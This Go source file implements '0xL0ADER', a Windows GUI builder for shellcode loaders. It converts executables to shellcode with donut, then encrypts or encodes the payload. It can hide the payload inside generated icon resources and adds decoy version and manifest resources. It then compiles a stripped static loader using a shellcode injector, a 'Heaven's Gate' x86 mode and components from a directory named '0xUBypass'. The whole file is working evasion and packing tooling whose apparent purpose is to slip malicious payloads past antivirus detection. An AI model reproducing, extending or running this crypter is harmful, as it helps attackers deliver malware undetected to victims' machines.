package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
)

type App struct {
	mw         *walk.MainWindow
	filePath   *walk.LineEdit
	encryption *walk.ComboBox
	mode       *walk.ComboBox
	embedKey   *walk.CheckBox
	genBtn     *walk.PushButton
	logBox     *walk.TextEdit
}

func main() {
	app := &App{}

	t := time.Now().Format("15:04:05")
	var sb strings.Builder
	fmt.Fprintf(&sb, "[%s] 0xL0ADER\r\n", t)
	gpp := findGpp()
	donut := findDonutExe()
	if gpp != "" {
		fmt.Fprintf(&sb, "[%s] g++: OK\r\n", t)
		if wr := findWindres(gpp); wr != "" {
			fmt.Fprintf(&sb, "[%s] windres: OK\r\n", t)
		} else {
			fmt.Fprintf(&sb, "[%s] windres: NOT FOUND\r\n", t)
		}
	} else {
		fmt.Fprintf(&sb, "[%s] g++: NOT FOUND — run install.ps1\r\n", t)
	}
	if donut != "" {
		fmt.Fprintf(&sb, "[%s] donut: OK\r\n", t)
	} else {
		fmt.Fprintf(&sb, "[%s] donut: NOT FOUND — run install.ps1\r\n", t)
	}

	if _, err := (MainWindow{
		AssignTo: &app.mw,
		Title:    "0xL0ADER",
		MinSize:  Size{Width: 640, Height: 520},
		Size:     Size{Width: 640, Height: 520},
		Layout:   VBox{Margins: Margins{Left: 10, Top: 10, Right: 10, Bottom: 10}, Spacing: 8},
		Children: []Widget{
			Composite{
				Layout: HBox{MarginsZero: true, Spacing: 6},
				Children: []Widget{
					LineEdit{
						AssignTo:  &app.filePath,
						ReadOnly:  true,
						CueBanner: "Select PE (.exe) or shellcode (.bin/.raw)...",
					},
					PushButton{
						Text:      "Browse",
						MaxSize:   Size{Width: 80, Height: 0},
						OnClicked: app.browseFile,
					},
				},
			},
			GroupBox{
				Title:  "Options",
				Layout: HBox{Spacing: 10},
				Children: []Widget{
					Label{Text: "Encryption:"},
					ComboBox{
						AssignTo:     &app.encryption,
						Model:        []string{"ECL", "RSA"},
						CurrentIndex: 0,
						MaxSize:      Size{Width: 80, Height: 0},
					},
					Label{Text: "Mode:"},
					ComboBox{
						AssignTo:     &app.mode,
						Model:        []string{"Callback", "x64", "x86"},
						CurrentIndex: 0,
						MaxSize:      Size{Width: 100, Height: 0},
					},
					HSpacer{},
					CheckBox{
						AssignTo: &app.embedKey,
						Text:     "Embed Key",
						Checked:  true,
					},
				},
			},
			PushButton{
				AssignTo:  &app.genBtn,
				Text:      "Generate Loader",
				MinSize:   Size{Width: 0, Height: 32},
				OnClicked: app.generate,
			},
			TextEdit{
				AssignTo: &app.logBox,
				ReadOnly: true,
				VScroll:  true,
				Text:     sb.String(),
				Font:     Font{Family: "Consolas", PointSize: 9},
			},
		},
	}).Run(); err != nil {
		log.Fatal(err)
	}
}

func (app *App) browseFile() {
	dlg := new(walk.FileDialog)
	dlg.Title = "Select PE or Shellcode"
	dlg.Filter = "Executables/Shellcode (*.exe;*.bin;*.raw)|*.exe;*.bin;*.raw|All Files (*.*)|*.*"
	if ok, err := dlg.ShowOpen(app.mw); err == nil && ok {
		app.filePath.SetText(dlg.FilePath)
	}
}

func (app *App) logMsg(msg string) {
	app.mw.Synchronize(func() {
		t := time.Now().Format("15:04:05")
		app.logBox.AppendText(fmt.Sprintf("[%s] %s\r\n", t, msg))
	})
}

func (app *App) generate() {
	inputPath := app.filePath.Text()
	if inputPath == "" {
		walk.MsgBox(app.mw, "Error", "Please select a file first.", walk.MsgBoxIconError)
		return
	}

	encIdx := app.encryption.CurrentIndex()
	modeIdx := app.mode.CurrentIndex()
	embed := app.embedKey.Checked()

	encryption := "ecl"
	if encIdx == 1 {
		encryption = "rsa"
	}
	mode := "callback"
	if modeIdx == 1 {
		mode = "x64"
	} else if modeIdx == 2 {
		mode = "x86"
	}

	app.genBtn.SetEnabled(false)
	app.logBox.SetText("")

	go func() {
		defer app.mw.Synchronize(func() {
			app.genBtn.SetEnabled(true)
		})

		outputData, privateKey, err := app.buildLoader(inputPath, mode, encryption, embed)
		if err != nil {
			app.logMsg("BUILD FAILED: " + err.Error())
			app.mw.Synchronize(func() {
				walk.MsgBox(app.mw, "Build Failed", err.Error(), walk.MsgBoxIconError)
			})
			return
		}

		app.mw.Synchronize(func() {
			base := filepath.Base(inputPath)
			ext := filepath.Ext(base)
			saveName := fmt.Sprintf("0xL0ADER_%s_%s_%s.exe", encryption, mode, strings.TrimSuffix(base, ext))

			dlg := new(walk.FileDialog)
			dlg.Title = "Save Loader"
			dlg.Filter = "Executable (*.exe)|*.exe"
			dlg.FilePath = saveName

			if ok, saveErr := dlg.ShowSave(app.mw); saveErr == nil && ok {
				if wErr := os.WriteFile(dlg.FilePath, outputData, 0755); wErr != nil {
					walk.MsgBox(app.mw, "Error", "Failed to save: "+wErr.Error(), walk.MsgBoxIconError)
					return
				}
				app.logMsg(fmt.Sprintf("Saved: %s (%d bytes)", dlg.FilePath, len(outputData)))
				if !embed && privateKey != "" {
					app.logMsg(fmt.Sprintf("Key: %s", privateKey))
					app.logMsg(fmt.Sprintf("Run: %s '%s'", filepath.Base(dlg.FilePath), privateKey))
				}
			}
		})
	}()
}

func (app *App) buildLoader(inputPath, mode, encryption string, embedKey bool) ([]byte, string, error) {
	inputData, err := os.ReadFile(inputPath)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read input: %w", err)
	}

	var gpp string
	if mode == "x86" {
		gpp = findGpp32()
		if gpp == "" {
			return nil, "", fmt.Errorf("32-bit MinGW g++ not found")
		}
	} else {
		gpp = findGpp()
		if gpp == "" {
			return nil, "", fmt.Errorf("MinGW g++ not found")
		}
	}

	tmpDir, err := os.MkdirTemp("", "0xL0ADER-*")
	if err != nil {
		return nil, "", fmt.Errorf("failed to create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var shellcode []byte
	isPE := len(inputData) >= 2 && inputData[0] == 'M' && inputData[1] == 'Z'
	if isPE {
		donutExe := findDonutExe()
		if donutExe == "" {
			return nil, "", fmt.Errorf("donut.exe not found")
		}
		inputPE := filepath.Join(tmpDir, "input.exe")
		if err := os.WriteFile(inputPE, inputData, 0644); err != nil {
			return nil, "", fmt.Errorf("failed to write input: %w", err)
		}
		app.logMsg(fmt.Sprintf("PE file (%d bytes)", len(inputData)))
		donutArch := "2"
		if mode == "x86" {
			donutArch = "1"
		}
		scPath := filepath.Join(tmpDir, "shellcode.bin")
		donutCmd := exec.Command(donutExe, "-i", inputPE, "-o", scPath, "-a", donutArch, "-f", "1", "-b", "3", "-e", "1")
		donutCmd.Dir = tmpDir
		donutOut, err := donutCmd.CombinedOutput()
		if err != nil {
			app.logMsg("Donut failed: " + string(donutOut))
			return nil, "", fmt.Errorf("donut failed: %s", donutOut)
		}
		shellcode, err = os.ReadFile(scPath)
		if err != nil || len(shellcode) == 0 {
			return nil, "", fmt.Errorf("donut produced no output")
		}
		app.logMsg(fmt.Sprintf("Donut: %d -> %d bytes (arch=%s)", len(inputData), len(shellcode), mode))
	} else {
		shellcode = inputData
		app.logMsg(fmt.Sprintf("Raw shellcode (%d bytes)", len(shellcode)))
	}

	if len(shellcode) == 0 {
		return nil, "", fmt.Errorf("shellcode is empty")
	}
	if len(shellcode) > 4*1024*1024 {
		return nil, "", fmt.Errorf("shellcode too large (%d bytes, max 4MB)", len(shellcode))
	}

	var (
		loaderCpp       string
		privateKey      string
		srcFilesNeeded  []string
		cppFiles        []string
		callbackPayload []byte
		icoRCLines      string
	)

	if encryption == "ecl" {
		if mode == "callback" {
			key := eclGenerateKey()
			privateKey = key
			compressed, cErr := deflateCompress(shellcode)
			if cErr != nil {
				return nil, "", fmt.Errorf("DEFLATE failed: %w", cErr)
			}
			app.logMsg(fmt.Sprintf("DEFLATE: %d -> %d bytes (%.1f%%)", len(shellcode), len(compressed), float64(len(compressed))*100/float64(len(shellcode))))
			app.logMsg("ECL key generation (SHA256-chain)...")
			encoded := eclEncodeDirect(compressed, key)
			app.logMsg(fmt.Sprintf("ECL: %d -> %d bytes (XOR 1:1)", len(compressed), len(encoded)))
			loaderCpp = oxuGenerateLoaderEclCallback(encoded, len(encoded), len(shellcode), key, embedKey)
			callbackPayload = encoded
		} else {
			key := eclGenerateKey()
			privateKey = key
			app.logMsg("ECL key generation (SHA256-chain)...")
			encodedData := eclEncode(shellcode, key)
			app.logMsg(fmt.Sprintf("ECL: %d -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
			if mode == "x86" {
				loaderCpp = oxuGenerateLoaderEclX86(encodedData, len(encodedData), len(shellcode), key, embedKey)
				srcFilesNeeded = []string{"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
			} else {
				loaderCpp = oxuGenerateLoaderEclX64(encodedData, len(encodedData), len(shellcode), key, embedKey)
			}
		}
		cppFiles = []string{filepath.Join(tmpDir, "main.cpp")}
		if mode == "x86" {
			cppFiles = append(cppFiles, filepath.Join(tmpDir, "WindowsShellcodeInjector.cpp"))
		}
	} else {
		app.logMsg("RSA keypair generation (64-bit primes)...")
		_, privKey, e, _, n, err := oxuGenerateKeyPair()
		if err != nil {
			return nil, "", fmt.Errorf("RSA keypair failed: %w", err)
		}
		privateKey = privKey
		app.logMsg("RSA keypair OK")

		paddedLen := len(shellcode)
		if paddedLen%oxuBlockSize != 0 {
			paddedLen = ((paddedLen / oxuBlockSize) + 1) * oxuBlockSize
		}
		encrypted := oxuEncryptShellcode(shellcode, e, n)
		app.logMsg(fmt.Sprintf("RSA: %d -> %d bytes", len(shellcode), len(encrypted)))

		switch mode {
		case "x86":
			loaderCpp = oxuGenerateLoaderX86(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h",
				"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
		case "callback":
			loaderCpp = oxuGenerateLoaderRsaCallback(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
			callbackPayload = encrypted
		default:
			loaderCpp = oxuGenerateLoaderX64(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
		}

		cppFiles = []string{
			filepath.Join(tmpDir, "main.cpp"),
			filepath.Join(tmpDir, "RSA.cpp"),
			filepath.Join(tmpDir, "mini-gmp.cpp"),
		}
		if mode == "x86" {
			cppFiles = append(cppFiles, filepath.Join(tmpDir, "WindowsShellcodeInjector.cpp"))
		}
	}

	if err := os.WriteFile(filepath.Join(tmpDir, "main.cpp"), []byte(loaderCpp), 0644); err != nil {
		return nil, "", fmt.Errorf("write main.cpp: %w", err)
	}

	if len(srcFilesNeeded) > 0 {
		srcDir := find0xUBypassDir()
		if srcDir == "" {
			return nil, "", fmt.Errorf("0xUBypass source directory not found")
		}
		for _, f := range srcFilesNeeded {
			data, err := os.ReadFile(filepath.Join(srcDir, f))
			if err != nil {
				return nil, "", fmt.Errorf("read %s: %w", f, err)
			}
			if err := os.WriteFile(filepath.Join(tmpDir, f), data, 0644); err != nil {
				return nil, "", fmt.Errorf("write %s: %w", f, err)
			}
		}
	}
	app.logMsg("Source files ready")

	if mode == "callback" && callbackPayload != nil {
		sizes := pickIconTier(len(callbackPayload))
		maxCap := iconPayloadCapForSizes(sizes) * len(iconGroupNames)
		if len(callbackPayload) > maxCap {
			return nil, "", fmt.Errorf("payload too large for icons (%d/%d bytes)", len(callbackPayload), maxCap)
		}
		icoFiles := generatePayloadIcons(callbackPayload)
		var rcLines strings.Builder
		for i, ico := range icoFiles {
			fname := iconGroupNames[i] + ".ico"
			if err := os.WriteFile(filepath.Join(tmpDir, fname), ico, 0644); err != nil {
				return nil, "", fmt.Errorf("write %s: %w", fname, err)
			}
			rcLines.WriteString(fmt.Sprintf("%d ICON \"%s\"\n", i+1, fname))
		}
		icoRCLines = rcLines.String()
		app.logMsg(fmt.Sprintf("Icons: %d bytes / %d group(s) (32bpp RGBA %v)", len(callbackPayload), len(icoFiles), sizes))
	}

	windres := findWindres(gpp)
	if windres == "" && mode == "callback" && icoRCLines != "" {
		return nil, "", fmt.Errorf("windres not found (required for callback)")
	}
	if windres != "" {
		manifestPath := filepath.Join(tmpDir, "app.manifest")
		os.WriteFile(manifestPath, []byte(manifestXML), 0644)
		rcContent := versionRC + "\n" + stringTableRC + "\n1 24 \"app.manifest\"\n"
		if mode == "callback" && icoRCLines != "" {
			rcContent = icoRCLines + "\n" + rcContent
		}
		rcPath := filepath.Join(tmpDir, "version.rc")
		if err := os.WriteFile(rcPath, []byte(rcContent), 0644); err == nil {
			resPath := filepath.Join(tmpDir, "version.o")
			wrCmd := exec.Command(windres, rcPath, "-O", "coff", "-o", resPath)
			wrCmd.Dir = tmpDir
			if wrOut, wrErr := wrCmd.CombinedOutput(); wrErr == nil {
				cppFiles = append(cppFiles, resPath)
				app.logMsg("PE resources (.rsrc) added")
			} else {
				if mode == "callback" && icoRCLines != "" {
					return nil, "", fmt.Errorf("windres failed: %s", wrOut)
				}
				app.logMsg("windres skipped: " + string(wrOut))
			}
		}
	}

	outputExe := filepath.Join(tmpDir, "0xu_loader.exe")
	compileArgs := []string{"-O2", "-s", "-static", "-I" + tmpDir}
	if mode == "callback" {
		compileArgs = []string{"-O2", "-s", "-mwindows", "-municode", "-static",
			"-Wl,--major-subsystem-version,6", "-Wl,--minor-subsystem-version,1",
			"-Wl,--stack,0x100000",
			"-I" + tmpDir}
	}
	compileArgs = append(compileArgs, cppFiles...)
	compileArgs = append(compileArgs, "-o", outputExe)
	if mode == "callback" {
		compileArgs = append(compileArgs, "-lole32", "-lmfplat")
	}

	app.logMsg("Compiling...")
	compileCmd := exec.Command(gpp, compileArgs...)
	compileCmd.Dir = tmpDir
	compileOut, err := compileCmd.CombinedOutput()
	if err != nil {
		app.logMsg("Compilation failed:\r\n" + string(compileOut))
		return nil, "", fmt.Errorf("compilation failed:\n%s", compileOut)
	}

	encLabel := strings.ToUpper(encryption)
	archLabel := mode
	if mode == "callback" {
		archLabel = "x64 Callback"
	} else if mode == "x86" {
		archLabel = "x86 (Heaven's Gate)"
	}
	app.logMsg(fmt.Sprintf("Compiled (%s, %s, static)", encLabel, archLabel))

	outputData, err := os.ReadFile(outputExe)
	if err != nil {
		return nil, "", fmt.Errorf("read output: %w", err)
	}
	hash := sha256.Sum256(outputData)
	app.logMsg(fmt.Sprintf("Output: %d bytes, SHA256: %s", len(outputData), hex.EncodeToString(hash[:])))

	if embedKey {
		app.logMsg("Key embedded — double-click to run")
	}

	return outputData, privateKey, nil
}

func findDonutExe() string {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	candidates := []string{
		filepath.Join(exeDir, "donut.exe"),
		filepath.Join(exeDir, "deps", "donut.exe"),
		filepath.Join(exeDir, "tools", "donut", "donut.exe"),
		filepath.Join(exeDir, "..", "tools", "donut", "donut.exe"),
		filepath.Join(exeDir, "..", "..", "tools", "donut", "donut.exe"),
		filepath.Join(".", "donut.exe"),
		filepath.Join(".", "deps", "donut.exe"),
		filepath.Join(".", "tools", "donut", "donut.exe"),
	}
	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	if p, err := exec.LookPath("donut.exe"); err == nil {
		return p
	}
	return ""
}

func findGpp() string {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	localCandidates := []string{
		filepath.Join(exeDir, "deps", "mingw64", "bin", "g++.exe"),
		filepath.Join(".", "deps", "mingw64", "bin", "g++.exe"),
	}
	for _, p := range localCandidates {
		if _, err := os.Stat(p); err == nil {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData != "" {
		clionGpp := filepath.Join(localAppData, "Programs", "CLion", "bin", "mingw", "bin", "g++.exe")
		if _, err := os.Stat(clionGpp); err == nil {
			return clionGpp
		}
	}
	for _, name := range []string{"g++.exe", "x86_64-w64-mingw32-g++.exe", "g++"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	return ""
}

func findGpp32() string {
	for _, name := range []string{"i686-w64-mingw32-g++.exe", "i686-w64-mingw32-g++"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	msys2Paths := []string{
		`C:\msys64\mingw32\bin\g++.exe`,
		`C:\tools\mingw32\bin\g++.exe`,
	}
	for _, p := range msys2Paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func findWindres(gppPath string) string {
	dir := filepath.Dir(gppPath)
	base := filepath.Base(gppPath)
	windresName := strings.Replace(base, "g++", "windres", 1)
	for _, name := range []string{windresName, "windres.exe"} {
		p := filepath.Join(dir, name)
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	if p, err := exec.LookPath("windres.exe"); err == nil {
		return p
	}
	return ""
}

func find0xUBypassDir() string {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	candidates := []string{
		filepath.Join(exeDir, "0xUBypass"),
		filepath.Join(".", "0xUBypass"),
		filepath.Join(exeDir, "..", "shellcode-loader-0xU", "0xUBypass"),
		filepath.Join("..", "shellcode-loader-0xU", "0xUBypass"),
	}
	for _, p := range candidates {
		if _, err := os.Stat(filepath.Join(p, "RSA.cpp")); err == nil {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	return ""
}
